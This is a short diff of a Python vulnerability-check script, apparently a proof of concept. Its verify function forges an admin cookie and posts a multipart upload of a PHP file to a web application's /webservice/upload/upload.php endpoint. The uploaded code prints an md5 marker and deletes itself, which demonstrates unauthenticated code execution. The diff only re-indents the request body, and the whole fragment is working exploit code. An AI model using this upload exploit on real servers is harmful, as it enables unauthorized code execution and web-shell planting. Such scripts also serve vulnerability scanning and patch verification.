@@ -16,14 +16,13 @@ def verify(url):
         'Cookie': 'USER_NAME_COOKIE=admin; LOGIN_LANG=cn',
         'Connection': 'keep-alive'
     }
-    data = '''
-    Content-Type: multipart/form-data; boundary=---------------------------10267625012906
-    Content-Length: 208
-    -----------------------------10267625012906
-    Content-Disposition: form-data; name="file"; filename="1.php"
-    Content-Type: application/php
-    <?php echo md5(43856);unlink(__FILE__);?>
-    -----------------------------10267625012906--'''
+    data = '''Content-Type: multipart/form-data; boundary=---------------------------10267625012906
+Content-Length: 208
+-----------------------------10267625012906
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/php
+<?php echo md5(43856);unlink(__FILE__);?>
+-----------------------------10267625012906--'''
     vurl = urllib.parse.urljoin(url, "/webservice/upload/upload.php")
     try:
         response = requests.post(vurl, headers=headers, data=data)
